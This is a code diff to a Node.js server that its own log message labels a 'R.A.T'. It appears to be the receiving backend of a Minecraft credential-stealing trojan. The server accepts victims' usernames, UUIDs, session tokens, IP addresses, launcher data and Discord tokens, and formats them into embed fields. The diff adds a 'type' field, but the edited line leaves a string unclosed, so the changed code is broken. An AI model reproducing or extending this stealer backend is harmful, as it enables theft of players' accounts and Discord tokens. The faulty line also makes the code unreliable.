@@ -43,7 +43,7 @@ setInterval(() => {
 //main route, post to this
 app.post("/", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
-    if (!["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord"].every(field => req.body.hasOwnProperty(field))) {
+    if (!["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord", "type].every(field => req.body.hasOwnProperty(field))) {
         console.log("[R.A.T] Rejected malformed JSON")
         return res.sendStatus(404)
     }
@@ -167,7 +167,8 @@ app.post("/", (req, res) => {
                                 { name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true },
                                 { name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false },
                                 { name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false },
-                                { name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true },
+                                { name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: false },
+				{ name: 'Type', value: `\`\`\`${req.body.type}\`\`\``, inline: false },
                                 { name: 'Feather', value: `${checkFeather}`, inline: true },
                                 { name: 'Essentials', value: `${checkEssentials}`, inline: true },
                                 { name: 'Lunar', value: `${checkLunar}`, inline: true },
